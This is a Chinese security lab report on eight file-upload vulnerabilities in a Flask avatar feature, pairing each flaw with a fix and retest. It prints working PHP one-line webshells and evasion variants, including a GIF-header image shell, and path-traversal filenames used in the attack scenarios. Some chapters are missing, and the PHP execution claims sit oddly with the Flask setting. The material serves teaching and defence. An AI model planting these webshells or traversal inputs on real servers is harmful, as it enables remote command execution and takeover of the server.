## 第一章 漏洞概述与风险评级

文件上传漏洞（Unrestricted File Upload）是 OWASP Top 10 中最为严重的高危漏洞之一。攻击者通过上传包含恶意代码的文件到服务器，可获得服务器远程控制权限，执行任意系统命令、窃取数据、横向移动。

| 评估项 | 评级/评分 |
|--------|-----------|
| CVSS 3.0 | 9.8（Critical） |
| 攻击向量 | 网络远程攻击（AV:N） |
| 攻击复杂度 | 低（AC:L） |
| 影响范围 | 完全控制服务器（C:H/I:H/A:H） |

### 本次实验发现的 8 个安全漏洞

在本次 Flask 应用的头像上传功能中，共发现以下 8 个安全漏洞：

| 编号 | 漏洞名称 | 风险等级 |
|:----:|---------|:--------:|
| V-01 | 未校验文件后缀，允许上传 .php/.phtml 等脚本文件 | 🔴 高危 |
| V-02 | 不检测文件真实 MIME/文件内容，图片马可正常上传 | 🔴 高危 |
| V-03 | 直接使用用户原始文件名保存，存在路径穿越漏洞 | 🔴 高危 |
| V-04 | 无随机重命名机制，存在同名文件覆盖风险 | 🟡 中危 |
| V-05 | 仅前端限制文件类型，后端无校验 | 🟡 中危 |
| V-06 | 上传目录未配置服务器规则，恶意脚本可被解析执行 | 🔴 高危 |
| V-07 | 无上传行为日志，无法溯源攻击行为 | 🟢 低危 |
| V-08 | 未校验最终保存路径，存在越目录写入风险 | 🔴 高危 |

## 第二章 一句话木马原理详解

### 2.1 什么是一句话木马

一句话木马（WebShell）是一段极短的恶意代码（通常仅 20 余字节），攻击者将其隐藏在上传的文件中。当服务器处理该文件时，木马代码被执行，攻击者通过 HTTP 请求参数控制服务器。

### 2.2 经典 PHP 一句话木马

```php
<?php @eval($_POST["cmd"]); ?>
```

### 2.3 代码拆解

| 代码段 | 作用 |
|--------|------|
| `<?php ... ?>` | PHP 代码标记，中间代码被执行 |
| `@` | 错误抑制符，隐藏输出防检测 |
| `eval()` | 核心危险函数，参数作 PHP 代码执行 |
| `$_POST["cmd"]` | 接收 HTTP POST 请求中 cmd 参数 |

### 2.4 一句话木马变种

| 变种代码 | 说明 |
|---------|------|
| `<?php @system($_REQUEST["cmd"]); ?>` | 用 system() 替代 eval()，直接执行系统命令 |
| `<?php @assert($_POST["cmd"]); ?>` | 用 assert() 绕过部分 WAF 检测 |
| `<?php $_GET["a"]($_POST["b"]); ?>` | 变量函数调用，动态执行 |
| `GIF89a<?php @eval($_POST["cmd"]); ?>` | GIF 文件头+一句话木马绕过图片检查 |

## 第四章 8 大漏洞逐项分析与修复

### V-01 未校验文件后缀（高危）

**漏洞描述**：上传功能未对文件后缀做任何检查，攻击者可上传 `.php`、`.phtml`、`.php5` 等可执行脚本文件。

**漏洞代码位置**：`app.py` 第 299-335 行（原始漏洞版本无此校验逻辑）。

**攻击场景**：
1. 攻击者登录系统，访问 `/upload` 页面。
2. 选择一句话木马文件 `shell.php` 上传。
3. 服务器将 `shell.php` 保存到 `static/uploads/` 目录。
4. 攻击者访问 `http://target/static/uploads/shell.php`，PHP 引擎解析执行木马。
5. 通过 POST 参数 `cmd=system('id')` 即可执行任意系统命令。

**修复方案**：建立白名单，仅允许图片格式扩展名。

**修复代码**：
```python
ALLOWED_EXTENSIONS = {".jpg", ".jpeg", ".png", ".gif", ".webp", ".bmp", ".ico"}
ext = os.path.splitext(file.filename)[1].lower()
if ext not in ALLOWED_EXTENSIONS:
    return render_template("upload.html", error="仅允许上传图片文件"), 400
```

**复测结果**：
- 上传 `.php` 文件 → 返回 400，拒绝上传
- 上传 `.exe` 文件 → 返回 400，拒绝上传
- 上传 `.png` 文件 → 上传成功

### V-02 不检测文件真实 MIME（高危）

**漏洞描述**：仅校验扩展名不够，攻击者可伪造文件后缀（如将 `shell.php` 改名为 `shell.jpg`）上传，绕过扩展名检查。更高级的攻击方式是图片马（在合法图片尾部追加恶意代码）。

**攻击场景**：
1. 创建 JPEG 文件头 + PHP 一句话木马的图片马。
2. 文件后缀命名为 `.jpg`，通过扩展名检查。
3. 扩展名检查通过，但文件内容实际包含恶意 PHP 代码。
4. 当服务器将文件重命名为 `.jpg` 并通过 HTTP 返回时，普通图片查看器正常显示，但若服务器配置不当或攻击者直接包含该文件，木马将执行。

**修复方案**：读取文件头部魔数（Magic Bytes），验证文件真实内容是否为图片格式。

**修复代码**：
```python
magic_bytes = file.read(12)
is_valid_image = (
    magic_bytes[:8] == b"\x89PNG\r\n\x1a\n"        # PNG
    or magic_bytes[:2] == b"\xff\xd8"                # JPEG
    or magic_bytes[:6] in (b"GIF87a", b"GIF89a")    # GIF
    or (magic_bytes[:4] == b"RIFF" and magic_bytes[8:12] == b"WEBP")  # WebP
    or magic_bytes[:2] == b"BM"                      # BMP
    or magic_bytes[:4] == b"\x00\x00\x01\x00"        # ICO
)
```

**支持的图片魔数**：

| 格式 | 魔数（十六进制） | 起始字节 |
|:----:|:----------------:|:--------:|
| PNG | `89 50 4E 47 0D 0A 1A 0A` | 前 8 字节 |
| JPEG | `FF D8` | 前 2 字节 |
| GIF | `47 49 46 38 37 61` 或 `47 49 46 38 39 61` | 前 6 字节 |
| WebP | `52 49 46 46 ... 57 45 42 50` | 前 4 + 8-12 字节 |
| BMP | `42 4D` | 前 2 字节 |
| ICO | `00 00 01 00` | 前 4 字节 |

**复测结果**：
- 纯文本文件重命名为 `.png` → 魔数校验失败，拒绝上传
- 真实 PNG 图片 → 魔数校验通过，上传成功
- JPEG 图片尾部追加 PHP 代码 → 魔数校验通过（头部合法），但配合 .htaccess 禁止解析

### V-03 路径穿越（高危）

**漏洞描述**：用户提供的原始文件名包含 `../` 等路径穿越字符时，可写入任意目录。例如 `../../shell.php` 可逃逸 `uploads` 目录。

**攻击场景**：
1. 攻击者使用 Burp Suite 拦截上传请求。
2. 将 `filename` 参数修改为 `../../shell.php`。
3. 如果后端直接拼接路径 `os.path.join(UPLOAD_DIR, filename)`，文件将写入网站根目录。
4. 攻击者直接通过 HTTP 访问 `/shell.php` 执行木马。

**修复方案**：使用 `uuid.uuid4().hex` 生成 32 位随机字符串作为文件名，完全消除用户对文件名的控制。同时使用 `Path.resolve()` 校验最终路径。

**修复代码**：
```python
import uuid
from pathlib import Path

safe_filename = uuid.uuid4().hex + ext
safe_path = Path(UPLOAD_DIR).resolve()
final_path = (safe_path / safe_filename).resolve()

if not str(final_path).startswith(str(safe_path)):
    return render_template("upload.html", error="文件名不合法"), 400

file.save(str(final_path))
```

**复测结果**：
- 上传文件名设为 `../../shell.php` → 扩展名校验拒绝（不在白名单）
- 上传文件名设为 `../../test.png` → UUID 重命名，保存为 `a1b2c3d4...snip...png`
- `Path.resolve()` 校验确保文件始终在 `UPLOAD_DIR` 内

### V-04 无随机重命名（中危）

**漏洞描述**：用户原始文件名直接作为存储文件名，同名文件会互相覆盖。

**攻击场景**：
1. 用户 A 上传头像 `avatar.png`。
2. 攻击者猜测到文件名，上传恶意文件同名 `avatar.png`。
3. 恶意文件覆盖用户 A 的头像。
4. 如果覆盖的是已上传的合法图片，正常用户将看到恶意内容。

**修复方案**：UUID 重命名，每个文件获得唯一名称。

**修复代码**（同 V-03）：
```python
safe_filename = uuid.uuid4().hex + original_ext
```

`uuid.uuid4().hex` 生成 32 位随机十六进制字符串，碰撞概率极低。

**复测结果**：
- 两次上传同名 `avatar.png` → 保存为两个不同 UUID 文件名，无覆盖
- 上传文件名为空 → 返回 400 错误

### V-05 仅前端限制（中危）

**漏洞描述**：上传表单设置 `accept="image/*"` 仅在浏览器端生效，攻击者使用 Burp Suite 抓包即可绕过，后端若无独立校验则完全失效。

**攻击场景**：
1. 浏览器上传页面选择图片，HTML 的 `accept="image/*"` 属性限制了文件选择器。
2. 攻击者使用 Burp Suite 拦截上传请求。
3. 修改请求中的 `filename` 和文件内容为恶意脚本。
4. 后端完全信任前端传来的参数，直接保存。

**修复方案**：后端独立执行完整的文件类型检测流程（扩展名校验 + 魔数校验），不依赖前端任何验证。

**修复代码**：后端 `upload()` 函数中独立执行完整的校验逻辑，与前端 HTML 的 `accept` 属性完全独立。

### V-06 上传目录可执行（高危）

**漏洞描述**：`static/uploads/` 目录未配置安全规则，上传的 `.php` 文件可直接被 Web 服务器解析执行。即使扩展名校验通过，如果目录允许脚本执行，仍存在风险。

**攻击场景**：
1. 攻击者上传 `shell.php`（如果扩展名校验缺失或绕过）。
2. 直接访问 `http://target/static/uploads/shell.php`。
3. Web 服务器将文件交给 PHP 引擎解析，木马被激活。

**修复方案**：在 `static/uploads/` 目录生成 `.htaccess` 文件，强制禁止 PHP 执行。应用启动时自动部署。

**修复代码**：
```python
def deploy_htaccess():
    htaccess_path = os.path.join(UPLOAD_DIR, ".htaccess")
    if not os.path.exists(htaccess_path):
        with open(htaccess_path, "w") as f:
            f.write('<FilesMatch "\\.(php|phtml|php3|php4|php5)$">\n')
            f.write("    Require all denied\n")
            f.write("</FilesMatch>\n")
```

**生成的 .htaccess 文件内容**：
```apache
<FilesMatch "\.(php|phtml|php3|php4|php5)$">
    Require all denied
</FilesMatch>
```

### V-07 无审计日志（低危）

**漏洞描述**：文件上传操作未记录任何日志，安全事件发生后无法溯源攻击者、攻击时间和攻击方式。

**影响分析**：
- 攻击者上传木马后不留痕迹。
- 无法确定：攻击发生时间、攻击者 IP 地址、被攻击的账号、上传了什么文件。
- 事件响应时无法评估损失范围。

**修复方案**：使用 Python `logging` 模块，每次上传记录完整的审计信息。

**修复代码**：
```python
audit_logger = logging.getLogger("upload_audit")
audit_handler = logging.FileHandler("logs/upload.log", encoding="utf-8")
audit_logger.addHandler(audit_handler)

# 每次上传记录
audit_logger.info(
    f"用户={session['username']} "
    f"IP={request.remote_addr} "
    f"原始文件={file.filename} "
    f"保存为={safe_filename} "
    f"扩展名={original_ext}"
)
```

**日志输出示例**：
```
2026-07-21 04:10:23,456 [INFO] 用户=admin IP=192.168.253.1 原始文件=avatar.png 保存为=a1b2c3d4e5f6...png 扩展名=.png 魔数校验=通过
```

### V-08 越目录写入（高危）

**漏洞描述**：`os.path.join(UPLOAD_DIR, filename)` 虽然拼接了 `uploads` 路径，但 `filename` 含 `../` 可逃逸到上层目录。如果攻击者上传 `../../app.py`，可覆盖应用主文件。

**攻击场景**：
1. 攻击者上传文件名设为 `../../../app.py`。
2. 如果 `os.path.basename()` 未使用，最终路径变为 `/opt/Class01/app.py`（逃逸了 3 层目录）。
3. 服务器主文件被恶意代码覆盖，网站瘫痪。
4. 更隐蔽的攻击：覆盖 `templates/index.html` 植入钓鱼页面。

**修复方案**（已包含在 V-03 中）：
```python
safe_path = Path(UPLOAD_DIR).resolve()
final_path = (safe_path / safe_filename).resolve()
if not str(final_path).startswith(str(safe_path)):
    return render_template("upload.html", error="文件名不合法"), 400
```

`Path.resolve()` 会解析所有的 `..` 和符号链接，得到绝对路径后，用 `startswith()` 确认文件仍在 `UPLOAD_DIR` 内。

## 第五章 修复方案总结

### 修复 1：文件后缀白名单（对应 V-01、V-05）

仅允许 7 种图片格式，后端独立校验，不依赖前端。

```python
ALLOWED_EXTENSIONS = {".jpg", ".jpeg", ".png", ".gif", ".webp", ".bmp", ".ico"}
```

读取文件头部 12 字节，验证魔数签名，防止伪造后缀和图片马。

### 修复 3：UUID 重命名 + 路径安全校验（对应 V-03、V-04、V-08）

```python
safe_filename = uuid.uuid4().hex + ext
safe_path = Path(UPLOAD_DIR).resolve()
final_path = (safe_path / safe_filename).resolve()
```

### 修复 4：上传目录安全配置（对应 V-06）

自动部署 `.htaccess` 禁止 PHP 文件在该目录解析执行。

### 修复 5：审计日志（对应 V-07）

使用 `logging` 模块记录每次上传的完整信息，支持安全事件溯源。

## 第七章 安全编码规范总结

### 核心原则

1. **白名单优于黑名单**：明确允许什么，而不是禁止什么。
2. **后端永不信任前端**：所有前端验证（HTML `accept`、JS 校验）均可轻易绕过，后端必须独立完整校验。
3. **纵深防御**：文件上传安全应叠加多层防护——扩展名校验 + 魔数校验 + UUID 重命名 + 路径安全 + 目录安全配置 + 审计日志。
4. **最小权限**：上传目录应禁止脚本执行，文件系统权限应最小化。

### 通用安全建议

| 措施 | 优先级 | 说明 |
|------|:------:|------|
| 参数化查询 | P0 | 防止 SQL 注入，根本解决方案 |
| 文件后缀白名单 | P0 | 拒绝可执行脚本文件 |
| 魔数内容检测 | P0 | 防止伪造后缀和图片马 |
| UUID 重命名 | P0 | 消除文件名控制权和覆盖风险 |
| 路径安全校验 | P0 | 防止越目录写入 |
| 上传目录安全配置 | P1 | .htaccess 或 Nginx 规则禁止脚本执行 |
| 审计日志 | P1 | 事后溯源和取证 |
| 文件大小限制 | P1 | 防止磁盘耗尽 DoS 攻击 |
| 文件数量限制 | P2 | 防止大量小文件耗尽 inode |
| 定期清理机制 | P2 | 避免无用文件长期占用磁盘 |
